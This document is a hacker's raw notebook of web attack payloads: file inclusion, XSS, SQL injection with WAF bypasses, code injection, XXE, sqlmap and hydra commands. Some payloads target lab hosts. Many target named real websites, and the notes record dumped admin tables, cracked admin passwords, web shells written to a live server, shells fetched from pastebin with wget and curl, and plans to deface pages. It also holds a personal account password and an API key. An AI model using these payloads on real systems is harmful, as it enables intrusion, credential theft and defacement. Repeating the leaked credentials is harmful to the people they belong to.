
http://192.168.0.111/file_inclusion/local_file_inclusion/LFI-0/index.php?page=../../../../../../../etc/passwd

http://192.168.0.111/file_inclusion/local_file_inclusion/LFI-0/index.php?page=php://input&cmd=ls


Post Data ==>
<?php
	system($_GET['cmd']);
?>



Read the php file in LFI
http://192.168.0.111/file_inclusion/local_file_inclusion/LFI-1/index.php?goto=php://filter/convert.base64-encode/resource=login


http://192.168.0.111/file_inclusion/local_file_inclusion/LFI-2/index.php?file=data:text/html,%3C?php%20phpinfo%28%29;?%3E


XSS

aaa "+" bbbb
var $a = ""+ alert(0) + "";
var $a = "";alert(0)//";

"";alert(0);

</script><script>alert(0);</script>

var aa = "hacker" + alert(0) + "dfdsfsd "

http://192.168.0.113/xss/example6.php?name=aaa" %2b alert(0) %2b "dfdsf


http://192.168.0.113/xss/example7.php?name=aaa' %2b alert(0) %2b 'dfds




php set /">
before ==> form action is
<form action="/xss/example8.php" method="POST">

after put http://192.168.0.113/xss/example8.php/aaaaaa
form action is ==>
<form action="/xss/example8.php/aaaaaa" method="POST">


http://192.168.0.113/xss/example8.php/"> <script>alert(0)</script>
<form action="/xss/example8.php/"> <script>alert(0)</script>" method="POST">


locaton.hash.substring




SQL Injection==>
1.UNION BASE 
String
Integer

2.Error Base
Single Query
Double Query

3.Blind Base
Boolean Base
Time Base

4.OOB ==> Out of Band


http://192.168.0.111/testme/vulnerabilities/sqli/?id=1'--+&Submit=Submit


--------   	SQL Comments	---------------------------------------------------
--+
-- -
--+-
#
/*
%23
%60
`    
--------   	SQL Comments	---------------------------------------------------

Step 1 ==> //Fix error with comments
//To Know sql injection vulnerable
'
"
\
`
-----------------------------------------------------------------------
Step 2 ==> Find the column count ( order by or group by)
http://192.168.0.111/testme/vulnerabilities/sqli/?id=1' order by 2--+&Submit=Submit  ==> col count 2


Step 3 ==> Find the Vulnerable Column ( Union Select ) ==> exploite column will show the number
http://192.168.0.111/testme/vulnerabilities/sqli/?id=1' UNION SELECT 1,2--+&Submit=Submit

http://192.168.0.111/testme/vulnerabilities/sqli/?id=1' UNION SELECT version(),2--+&Submit=Submit
http://192.168.0.111/testme/vulnerabilities/sqli/?id=1' UNION SELECT version(),database()--+&Submit=Submit

http://192.168.0.111/testme/vulnerabilities/sqli/?id=1' UNION SELECT @@version(),@@database()--+&Submit=Submit	
http://192.168.0.111/testme/vulnerabilities/sqli/?id=1' UNION SELECT USER(),database()--+&Submit=Submit



//use concat to select from one column
http://192.168.0.111/testme/vulnerabilities/sqli/?id=1' UNION SELECT USER(),CONCAT(version(), '==>', database() ) --+&Submit=Submit



Hash Killer

https://www.youtube.com/watch?v=qIQgWilJfA0

this app can't run on your pc windows 8

Win 8.1 This app can't run on your PC


SQL Integer 
comments
--

select group_concat(table_name) from information_schema.tables where table_schema=database()

select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'

4.Find the table names
id=1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()
--&Submit=Submit


5.Find the column names tables
id=1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'--&Submit=Submit

http://192.168.0.111/testme/vulnerabilities/sqli/?id=1' union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'--+&Submit=Submit#

//Medium ==> change users to hexCode 
id=1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273--&Submit=Submit


6. dump data from column


http://192.168.0.111/testme/vulnerabilities/sqli/?id=1' union select group_concat(user, 0x3a3a, password, '<br/>'),null from users--+&Submit=Submit#
id=1 union select group_concat(user, 0x3a3a, password, 0x3c62722f3e),null from users--&Submit=Submit

https://hashkiller.co.uk/md5-decrypter.aspx


http://localhost/sqli-labs-master/Less-1/?id=900'union select 1111,version(),33333--+

http://localhost/sqli-labs-master/Less-2/?id=9999 union select 111,222,version()--


Lesson 3 ==>
MySQL server version for the right syntax to use near ''3'') LIMIT 0,1' at line 1
seemed like they $input is used as ('$input') ==> so to pass that use ') and to bypass 

http://localhost/sqli-labs-master/Less-3?id=999') union select 1,2,version()--+


http://localhost/sqli-labs-master/Less-4?id=999")union select 1,2,version()--+


http://www.romanianwriters.ro/s.php?id=999' union select 1,2,group_concat(table_name)  from information_schema.tables where table_schema='romanian_svc'--+


Lesson 11 ==>
uname=admin999'union select 11,version()--+&passwd=admin&submit=Submit

Lesson12==>
uname=admin9999")union select 1,version()--+&passwd=admin&submit=Submit


//Real world
www.longderse.in.th/main/index.php?id=-85563 UNION SELECT 1,2,3,4,5,6,version(),database(),9,10,11,12,13,14,15,16,17,18,19,20


http://www.longderse.in.th/main/index.php?id=-85563 UNION SELECT 1,2,3,4,5,6,group_concat(table_name),8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.tables where table_schema=database()

tbweb_user

http://www.longderse.in.th/main/index.php?id=-85563 UNION SELECT 1,2,3,4,5,6,group_concat(column_name),8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.columns where table_schema=database() and table_name='tbweb_user'

Sql dump ==>
https://pastebin.com/fuy7XqKZ

(select (@x) from (select (@x:=0x00), (select (0) from (information_schema.columns) where (table_schema!=0x696e666f726d6174696f6e5f736368656d61) and (0x00) in (@x:=/*!50000concat*/(@x,0x3c62723e,table_schema,0x272d2d3e27,table_name,0x272d2d3e27,column_name))))x)

(select (@) from (select (@:=0x00), (select (@) from tbl_admin_info where (@) in (@:=/*!50000concat*/(@,user_name,0x3a,password))))a)


SQL injection bypass


mmsecurity.net/evil.js


If server side retrieve data from two table 
one table have 2 columns
another have 3 columns

From that state ==>
If used Union select 2 columns that column no. will be invalid if take 2 that show 3

http://192.168.0.111/sqli-labs-master/Less-5/?id=-1'or 1 group by concat_ws(0x3a,version(),floor(rand(0)*2)) having min(0) or 1--+

Duplicate Entry ==> error base

//Error Base
http://192.168.0.111/sqli-labs-master/Less-5/?id=1'or 1 	
--+

//Retrieve tables
http://192.168.0.111/sqli-labs-master/Less-5/?id=1'
and (select 1 from (select count(*),concat((select(select concat(cast(table_name as char),0x7e)) from information_schema.tables where table_schema=database() limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
--+



Show columns from table
http://192.168.0.111/sqli-labs-master/Less-5/?id=1'
and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,cast(column_name as char),0x27,0x7e) FROM information_schema.columns Where table_schema=Database() AND table_name=0x7573657273 LIMIT 2,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
--+


Dump data from columns
http://192.168.0.111/sqli-labs-master/Less-5/?id=1'
and (select 1 from (select count(*),concat((select(select concat(cast(concat(username,0x7e,password) as char),0x7e)) from security.users limit 2,1),floor(rand(0)*2))x from information_schema.tables group by x)a) 
--+


http://192.168.0.111/sqli-labs-master/Less-7/?id=1'))order by 3--+

inurl:admin.(php|html|php3) site:th


http://192.168.0.111/sqli-labs-master/Less-6/?id=-1"or 1 group by concat_ws(0x3a,version(),floor(rand(0)*2)) having min(0) or 1--+


specific website ==> site:ace.com

zerofreak.blogspot.com


Local File T 

Dump Out File ==> +into+outfile+'path'
===>Path
==>Permission
http://192.168.0.111/sqli-labs-master/Less-7/?id=-1'))union select 1111,'<?php system($_GET[cmd]); ?>',333+into+outfile+'/opt/lampp/htdocs/aa.php'--+



Lesson 13
uname=admin&passwd=aa')order by 2--+&submit=Submit

Lesson 14
uname=admin"order by 2--+&passwd=aa&submit=Submit

SQL Injection Dork 2017



http://www.bible-history.com/subcat.php?id=-1 union select version()--+
http://www.bible-history.com/subcat.php?id=-1 union select database()--+ 
http://www.bible-history.com/subcat.php?id=-1 union select group_concat(table_name) from information_schema.tables where table_schema=database()--+
administrators


http://www.bible-history.com/subcat.php?id=-1 union select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='administrators'--+
admin_id,admin_username,admin_password,admin_first_name,admin_last_name



http://www.bible-history.com/subcat.php?id=-1 union select group_concat(admin_username, 0x3a3a, admin_password, '<br/>') from administrators--+
jc::Mos3s



union select '<?php system($_GET[cmd]); ?>'+into+outfile+'/opt/lampp/htdocs/aa.php'
http://www.bible-history.com/subcat.php?id=-1 union select '<?php system($_GET[cmd]); ?>'+into+outfile+'/opt/lampp/htdocs/aa.php'--+


MCSC SQL Lab
http://192.168.0.113/sql/lab1/index.php?id=1'order by 5--+
http://192.168.0.113/sql/lab1/index.php?id=-1'UNION SELECT 1,version(),3,4,5--+


http://192.168.0.113/sql/lab2/?id=-1 UNION SELECT 1,version(),3,4,5--+
http://192.168.0.113/sql/lab3/?id=-111 union select 1111,version() --+


http://192.168.0.113/sql/lab5/?id=-1') UNION SELECT 1,version(),3,4,5--+
http://192.168.0.113/sql/lab6/?id=-1")UNION SELECT 1,version(),3,4,5--+

http://192.168.0.113/sql/lab8/?id=1' or 1 group by concat_ws(0x3a,version(),floor(rand(0)*2)) having min(0) or 1 --+
http://192.168.0.113/sql/lab9/?id=-1')) UNION SELECT 1,version(),3,4,5--+

http://192.168.0.113/sql/lab10/?id=1
username=admin' union select 1111,version()--+&password=aa


http://192.168.0.113/sql/lab7/index.php?id=-1))union%20select%20version(),222222,33333,44444,55555--%20-


concat(0x<title></title>

find diff in linux ==> use diff aa.txt bb.txt



view-source:http://192.168.0.113/sql/lab4/?id=2 union select 1111,version(),333333,44444



//Fire wall ==>
Not Acceptable!
An appropriate representation of the requested resource could not be found on this server. This error was generated by Mod_Security.

http://www.multan.gov.pk/files.php?id=-1 /*!50000UNION */ SELECT 111111,222222 #


http://www.multan.gov.pk/files.php?id=-1 /*!50000UNION */ SELECT 111111,version() #




//SQL Blind Base
Boolean
Tme base

Sqlmap -h
sqlmap -u ""


-p id 


https://pastebin.com/u/cyberoot

webproxy.to

mmsecurity.net/evil.js

web developer tool bar


https://pastebin.com/u/cyberoot

http://www.huetouristvietnam.com

http://robertocarlosmoreira.com.br/links.php?id=74

Forbidden => Fire wall

http://robertocarlosmoreira.com.br/links.php?id=-74 '
/*!50000UNION */ SELECT 111111,
version()
,33333,44444
--+


http://robertocarlosmoreira.com.br/links.php?id=-74 '
/*!50000UNION */ SELECT 111111,
/*!50000database*/()
,33333,44444
--+

ef2797861e4e5f9c9528a807ecfea7de

//table names 
http://robertocarlosmoreira.com.br/links.php?id=-74 '/*!50000UNION */ SELECT 111111,group_concat(/*!50000table_name*/),33333,44444 from /*!50000information_schema*/.tables where table_schema=/*!50000database */()--+


//select table names
http://dsquared.co.th/listcat.php?catnox=-71')/*!50000UNION*/ SELECT 1,2,3,/*!50000Group_cOncat(table_name)*/,5,6,7,8,9,10 from /*!50000information_schema.tables*/ where table_schema=database()--+&id=21&lng=0


//select column names
http://dsquared.co.th/listcat.php?catnox=-71')/*!50000UNION*/ SELECT 1,2,3,
/*!50000Group_cOncat(column_name)*/,5,6,7,8,9,10+from+/*!50000information_schema.columns*/ where table_schema=database()+and+table_name='company'--+&id=21&lng=0


//Dump in one Shot ( Database,Table,Column )
http://dsquared.co.th/listcat.php?catnox=-71')
/*!50000UNION*/ SELECT 1,2,3,
(select (@x) from (select (@x:=0x00), (select (0) from (information_schema.columns) where (table_schema!=0x696e666f726d6174696f6e5f736368656d61) and (0x00) in (@x:=/*!50000concat*/(@x,0x3c62723e,table_schema,0x272d2d3e27,table_name,0x272d2d3e27,column_name))))x),5,6,7,8,9,10
--+&id=21&lng=0


//Select Data From opertor
http://dsquared.co.th/listcat.php?catnox=-71')/*!50000UNION*/ SELECT 1,2,3,/*!50000Group_cOncat(user,'==>',pass,'<br/>')*/,5,6,7,8,9,10+from+
opertor--+&id=21&lng=0

//use hash killer to decrypt
oawebadmin==>ef2797861e4e5f9c9528a807ecfea7de ==> oasc0521
,adminweb==>HYOX9WbFVh ==> 

//From web admin ==> can insert php file or xss or deface page
http://www.dsquared.co.th/admin
oawebadmin==>ef2797861e4e5f9c9528a807ecfea7de ==> oasc0521


//xss script by using String.fromCharCode from hacked bar ==> can convert html String to charCode
document.documentElement.innerHTML=String.fromCharCode


edit home page by adding script
//http://www.dsquared.co.th/admin/htmlcode.php?code=5&id=1&edit=N&itemxx=1&ckx=&id=1


http://192.168.0.107/admin/edit.php?id=3'

03cceba76a738e818d021e161068bec9


//if load file can see out file can output the file
http://192.168.0.107/admin/edit.php?id=-3 union select 1,user(),load_file('/etc/passwd'),4

http://192.168.0.107/admin/edit.php?id=-3 union select 1,user(),load_file('/etc/passwd'),4+into+outfile+'/var/www/css/Aung.txt'

in etc/passwd===> bin/bash par yin ssh par tae

nmap -sV www
ssh 

//crack
hydra  -l user -P rockyou75.txt 192.168.0.107 ssh 





//Find open port 
nmap -sV 192.168.0.107

hydra -h 

//Find the password of ssh by hydra
hydra -l user -P pass.txt 192.168.0.107 ssh


//Get Root Access
sudo -i
sudo -v 
sudo bash


//connect remote server
ssh user@192.168.0.107

//get current version 
uname -a 

pivoting

===> Routing
Shell ==>
C99
404


http://192.168.0.123/test/bd.php
?cmd=wget https://pastebin.com/raw/yqdVDNFw -O shellAA.php

//open port on client
nc -lvp 44444

//
http://192.168.0.123/test/shellTT.php

from that Back-connect [perl]
==> enter client ip address and open port


3.13.0 local exploit

to check perl have or not
perl -v

nc -lvp 44444

after connect 


https://www.exploit-db.com/exploits/25444/ //2.6.32 exploit
upload  3.13.0 local exploit c file and compile it to get root access


if perl shell can't try with
4040 shell

if firewall is on have to close firewall
serverworld
systemctl 

try with 
php back connect shell

if permission denied


959950962640

skype account
1621986@Aung


//Found the site
http://studentvote.ca/2011/results/index.php?id=-1%20/*!50000UNION*/%20SELECT%201111,22222,(select%20(@x)%20from%20(select%20(@x:=0x00),%20(select%20(0)%20from%20(information_schema.columns)%20where%20(table_schema!=0x696e666f726d6174696f6e5f736368656d61)%20and%20(0x00)%20in%20(@x:=/*!50000concat*/(@x,0x3c62723e,table_schema,0x272d2d3e27,table_name,0x272d2d3e27,column_name))))x),444,555,666--+
http://studentvote.ca/2011/results/index.php?id=-1 /*!50000UNION*/ SELECT 1111,22222,/*!50000Group_cOncat(admin,'==>',password,'<br/>')*/ ,444,555,666 from admin--+
http://studentvote.ca/2011/results/index.php?id=-1 /*!50000UNION*/ SELECT 1111,22222,/*!50000Group_cOncat(admin,'==>',password,'<br/>')*/ ,444,555,666 from admin--+


http://studentvote.ca/2011/results/index.php?id=-1 /*!50000UNION*/ SELECT 1111,22222,/*!50000Group_cOncat(adminuser,'==>',password,'<br/>')*/ ,444,555,666 from election09_admin where table_schema='votee_studentvotesDB'--+

`dbname`.`admin`


//Access Denied
http://www.adopfrance.fr/gb/galerie/index.php?id=3 and (select 1 from(select count(*),concat((select (select concat(0x7e,0x27,cast(version() as char),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1




https://stackoverflow.com/questions/16963413/regarding-google-places-api

https://addons.mozilla.org/en-US/firefox/addon/geolocation/


Google place api key ==> AIzaSyC2hmb2Eo-XmZgfJbpKv-hKThIUkZi_AEw


Google place reference Document ==> 
https://developers.google.com/maps/documentation/javascript/places

Concept of lat long
https://www.geovista.psu.edu/grants/MapStatsKids/New_MSK/concepts_latlg.html
https://www.geovista.psu.edu/grants/MapStatsKids/MSK_portal/concepts_latlg.html
http://whatis.techtarget.com/definition/latitude-and-longitude


http://192.168.0.100/bd.php?cmd=cd aa;curl https://pastebin.com/raw/yqdVDNFw -O lol1.php
http://192.168.0.100/bd.php?cmd=cd aa;mv yqdVDNFw AungShell.php



Time base
and sleep(6)

Code Injection
php ==> eval() ==> accept any string and can convert function


http://192.168.0.115/codeexec/example1.php?name=hacker"
showing that syntax error , parse error php file is used eval() function  
//Example ==> $input = "hacker" ";	
Parse error: syntax error, unexpected '!', expecting ',' or ';' in /var/www/codeexec/example1.php(6) : eval()'d code on line 1 

http://192.168.0.115/codeexec/example1.php?name=hacker";//
//Example ==> $input = "hacker";// ";	


http://192.168.0.115/codeexec/example1.php?name=hacker";phpinfo();//
//Example ==> $input = "hacker";phpinfo();// ";	

http://192.168.0.115/codeexec/example1.php?name=hacker".system('ls')."
//Example ==> $input = "hacker".system('ls')."  ";	

input = 'hacker'.phpinfo() ;// ';
http://192.168.0.115/codeexec/example4.php?name=hackervvxv'.phpinfo();// 

http://192.168.0.115/codeexec/example4.php?name=hackervvxv'.system('ls');// 

ttp://192.168.0.115/codeexec/example2.php?order=id);}//

http://192.168.0.115/codeexec/example2.php?order=id);}phpinfo();//


http://192.168.0.115/codeexec/example3.php?new=phpinfo()&pattern=/lamer/e&base=Hello lamer


LDAP server
Light Weight 


inurl: admin/edit.php

http://192.168.0.106/ldap/example2.php?name=admin)(userPassword=*))%00&password=hacker


XML Attack ==>
https://pastebin.com/Kv7YFyGE

//cat /etc/passwd
%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%3F%3E%20%3C%21DOCTYPE%20foo%20%5B%20%20%20%20%3C%21ELEMENT%20foo%20ANY%20%3E%20%20%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2f%2f%2fetc%2fpasswd%22%20%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2ffoo%3E
 
//xss alert
%3Chtml%3E%3C%21%5BCDATA%5B%3C%5D%5D%3Escript%3C%21%5BCDATA%5B%3E%5D%5D%3Ealert%28%27xss%27%29%3C%21%5BCDATA%5B%3C%5D%5D%3E%2fscript%3C%21%5BCDATA%5B%3E%5D%5D%3E%20%3C%2fhtml%3E
 
//url request
%3C%21DOCTYPE%20foo%20%5B%20%20%3C%21ELEMENT%20foo%20ANY%3E%20%20%3C%21ENTITY%20bar%20SYSTEM%20%20%22http%3A%2f%2f192.168.0.107%2finputfile.txt%22%3E%5D%3E%3Cfoo%3E%20%20%26bar%3B%3C%2ffoo%3E


http://web.chal.csaw.io:7311/?path=%252e%252e/

. ==> hex encode ==> 2e   
% ==> hex encode ==> 25


Joomala
administrator
?com=id


word press ==> XSS ma paut ==>
wordpress  > exploit > themes and plugins
/wp-admin
/wp-content
id=5
/about




exploit will be theme and plugin

CI 

==> to get server info
viewdns.info
reverse ip


.htaccess ===> allow php file to be read as plain text file
//insert .htaccess in your target directory and
edit .htaccess
AddType text/plain php

nmap -sV 108.167.180.197


site:bd/administrator

namp -A ip  ==> server version


exploit-db.com



http://192.168.0.120/wordpress/wp-content/plugins/wp-mobile-detector//themes/amanda-mobile/style.php?path=http://192.168.0.120/wordpress/api/websitez-options.json&ver=4.7

Search wp-mobile-detector exploit
//https://www.exploit-db.com/exploits/39891/


user agent switch to mobile view

http://192.168.0.120/wordpress/wp-content/plugins/wp-mobile-detector/resize.php?src=http://192.168.0.115/405.php
http://192.168.0.120/wordpress/wp-content/plugins/wp-mobile-detector/cache/system.php?cmd=dir


simple Upload
https://pastebin.com/Mx33JVWN



http://www.jmtv.com/news.php?id=-3 union select 1,2,/*!50000Group_cOncat(username,'==>',password,'<br/>')*/ from users--+

http://www.jmtv.com/news.php?id=-3 union select 1,2,(select (@x) from (select (@x:=0x00), (select (0) from (information_schema.columns) where (table_schema!=0x696e666f726d6174696f6e5f736368656d61) and (0x00) in (@x:=/*!50000concat*/(@x,0x3c62723e,table_schema,0x272d2d3e27,table_name,0x272d2d3e27,column_name))))x)--+


http://bw-plast.com/en/news.php?id=-2 UNION SELECT 1,2,3,4,(select (@x) from (select (@x:=0x00), (select (0) from (information_schema.columns) where (table_schema!=0x696e666f726d6174696f6e5f736368656d61) and (0x00) in (@x:=/*!50000concat*/(@x,0x3c62723e,table_schema,0x272d2d3e27,table_name,0x272d2d3e27,column_name))))x),6,7,8,9,10,11,12,13,14--+

XSS Form Action
http://192.168.0.115/xss/example8.php/"><script>alert(0)</script>


//by appending %0a ==> Line Break ==> filter will confuse
sqlmap -u -v "http://192.168.0.115/sqli/example7.php?id=2%0a" --current-db --level 3 --dbms=mysql  //Retrieve Current DB

sqlmap -u -v "http://192.168.0.115/sqli/example7.php?id=2%0a" --tables -D exercises  //Retrieve Tables

sqlmap -u -v "http://192.168.0.115/sqli/example7.php?id=2%0a" --columns -T users -D exercises //Retrieve Columns

sqlmap -u -v "http://192.168.0.115/sqli/example7.php?id=2%0a" --dump -C username,password -T users -D exercises




http://www.interaliaproject.com/news.php?id=-160'/*!50000UNION*/ SELECT 1,2,(select (@x) from (select (@x:=0x00), (select (0) from (information_schema.columns) where (table_schema!=0x696e666f726d6174696f6e5f736368656d61) and (0x00) in (@x:=/*!50000concat*/(@x,0x3c62723e,table_schema,0x272d2d3e27,table_name,0x272d2d3e27,column_name))))x),4,5,6--+

//Cookie Injection 
http://192.168.0.110/sqli-labs-master/Less-18/


Column count doesn't match value count at row 1 //Saying that insert statement

user agent ==> add new user agent and pass it '
and solve error
if the error show column doesnot match ==>
in the user agent  add ==> ','b'  ,'c')#

in the user agent  add ==> ','b'  ,'c')#

','b' or (select 1 from (select count(*),concat((select(select concat(cast(version() as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
,'c')#

//Referer
http://192.168.0.110/sqli-labs-master/Less-19/
','a' or (select 1 from (select count(*),concat((select(select concat(cast(database() as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) )#



http://192.168.0.110/sqli-labs-master/Less-20/index.php //After successful login ===> cookie is set ==>
Cookie: uname=admin'and (select 1 from (select count(*),concat((select(select concat(cast(database() as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+; PHPSESSID=4249kr7nm95nmuckp6129st1h7
